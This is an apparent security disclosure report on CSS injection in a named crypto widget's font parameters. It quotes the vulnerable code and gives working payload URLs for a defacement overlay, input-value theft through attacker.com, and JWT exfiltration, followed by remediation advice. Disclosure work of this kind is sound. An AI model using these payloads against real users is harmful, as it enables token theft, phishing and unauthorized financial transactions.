# CSS Injection in Ripio B2B Widget - Vulnerability Report

## Summary

The Ripio B2B Widget at `https://d2pneqdaei3b3x.cloudfront.net/index.html` is vulnerable to CSS Injection through font customization parameters. This can be exploited to exfiltrate sensitive data including JWT authentication tokens.

## Severity: HIGH

- **CVSS Score**: 7.5+ (depending on exploitation scenario)
- **Type**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

## Affected Component

- **URL**: `https://d2pneqdaei3b3x.cloudfront.net/index.html`
- **Parameters**: `_fn` (Font Name), `_fo` (Font Options), `_fd` (Font Default)

## Vulnerable Code

From the widget's `index.html`:

```javascript
function getStyleInnerText() {
  const queryParams = getQueryParams();
  const fontOpts = getFontOptsFrom(queryParams); // User input: _fo
  const fontName = getFontNameFrom(queryParams); // User input: _fn
  const fontDefault = getFontDefault(queryParams); // User input: _fd

  // VULNERABLE: Direct string interpolation without sanitization
  const customFontsText = `@import url('https://fonts.googleapis.com/css2?family=${fontOpts}'); 
    body { font-family: '${fontName}', ${fontDefault};}`;

  return hasntSetCustomFont ? defaultFontsText : customFontsText;
}

function injectStyle() {
  const style = document.createElement("style");
  style.innerText = getStyleInnerText(); // Injected into DOM
  head.appendChild(style);
}
```

## Proof of Concept - WORKING EXPLOITS

### 1. Basic CSS Injection - RED BACKGROUND

**CLICK TO TEST:**

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Ared%20!important%7D/*&_fo=y
```

Payload (decoded): `_fn=x';}*{background:red !important}/*`

This closes the font-family rule and injects `*{background:red !important}` which makes entire page red.

### 2. PHISHING OVERLAY ATTACK

**CLICK TO TEST:**

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7Dbody%3A%3Abefore%7Bcontent%3A%27HACKED%27%3Bposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Ablack%3Bcolor%3Ared%3Bfont-size%3A80px%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bz-index%3A9999%7D/*&_fo=y
```

This injects a full-screen overlay with "HACKED" text, demonstrating phishing potential.

### 3. Data Exfiltration via CSS

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x';}input[value^="a"]{background:url('https://attacker.com/log?c=a')}input[value^="b"]{background:url('https://attacker.com/log?c=b')}/*&_fo=y
```

CSS attribute selectors can extract input values character-by-character by triggering requests to attacker server.

### 4. JWT Token Exfiltration (Combined Attack)

When JWT is passed in URL (`_to` parameter), the token can be exfiltrated:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=eyJhbGciOiJSUzI1NiJ9.VICTIM_TOKEN&_fn=x';}*{background:url('https://attacker.com/steal')}/*&_fo=y
```

Token leakage vectors:

- **HTTP Referer header** - when user clicks any external link
- **CSS url() requests** - background-image triggers request to attacker
- **Browser history** - token persists in URL
- **Server access logs** - token logged by any proxy/CDN

## Impact

1. **Token Theft**: JWT tokens authorize financial operations (trading, withdrawals)
2. **Phishing**: Attackers can restyle the widget to capture credentials
3. **Session Hijacking**: Stolen tokens can be used to perform unauthorized transactions
4. **Data Exfiltration**: CSS attribute selectors can extract sensitive form data

## Remediation

1. **Sanitize font parameters**: Whitelist allowed characters (alphanumeric, spaces, hyphens)
2. **Use CSP**: Implement strict Content-Security-Policy
3. **Move JWT from URL**: Use Authorization header or secure cookies instead
4. **Encode output**: Escape special CSS characters before injection

## References

- Widget Documentation: https://docs.ripio.com/crypto-as-a-service/widget/buy-hold-sell-widget
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
